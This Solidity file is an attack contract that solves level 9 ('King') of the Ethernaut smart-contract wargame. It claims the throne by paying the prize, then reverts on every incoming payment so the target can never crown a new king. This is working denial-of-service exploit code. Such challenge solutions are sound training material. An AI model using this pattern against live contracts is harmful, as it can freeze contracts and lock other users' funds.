// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./interfaces/IKing.sol";

/**
 * @title King Attack (Ethernaut Challenge Level 9 - King)
 * @author Emre Tepe (@emretepedev)
 * @notice Attack contract for level 9
 * @custom:ethernaut https://ethernaut.openzeppelin.com/level/0x43BA674B4fbb8B157b7441C2187bCdD2cdF84FD5
 */
contract KingAttack {
    /*//////////////////////////////////////////////////////////////
                                Attack
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice Attack and solve the level
     * @param target Address of target contract
     */
    function attack(IKing target) external payable {
        require(msg.value >= target.prize(), "King: Value must be gt|eq prize");

        // solhint-disable-next-line avoid-low-level-calls
        (bool isSuccess, ) = address(target).call{ value: msg.value }("");

        require(isSuccess, "King: Call error");

        require(address(this) == target._king() && msg.value == target.prize(), "King: Attack failed");
    }

    /*//////////////////////////////////////////////////////////////
                            Helpers & Others
    //////////////////////////////////////////////////////////////*/

    receive() external payable {
        revert("King: Level passed");
    }
}
